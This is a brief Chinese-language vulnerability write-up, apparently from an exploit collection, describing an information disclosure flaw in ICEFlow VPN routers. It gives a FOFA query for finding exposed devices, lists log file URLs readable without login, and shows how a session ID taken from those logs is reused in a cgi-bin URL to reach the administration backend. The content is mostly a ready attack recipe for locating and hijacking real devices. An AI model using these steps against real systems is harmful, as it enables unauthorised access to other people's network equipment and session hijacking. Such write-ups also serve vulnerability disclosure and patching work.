# ICEFlow VPN 信息泄露漏洞

## 漏洞描述

ICEFlow VPN 存在信息泄露漏洞，攻击者可以查看日志中的敏感数据来进一步攻击系统

## 漏洞影响

```
ICEFlow VPN
```

## FOFA

```
title="ICEFLOW VPN Router"
```

## 漏洞复现

可访问的日志 Url

```plain
系统日志    http://url/log/system.log
VPN日志    http://url/log/vpn.log
访问日志	http://url/log/access.log
告警日志	http://url/log/warn.log
错误日志	http://url/log/error.log
调试日志	http://url/log1/debug.log
移动用户日志 http://url/log/mobile.log
防火墙日志	http://url/log/firewall.log
```

![](./images/202202101850471.png)



根据日志信息获得session后，可利用实时登录系统管理后台：



```plain
http://xxx.xxx.xxx.xxx/cgi-bin/index?oid=10&session_id=xxxxxxxxxxxxxx&l=0
```

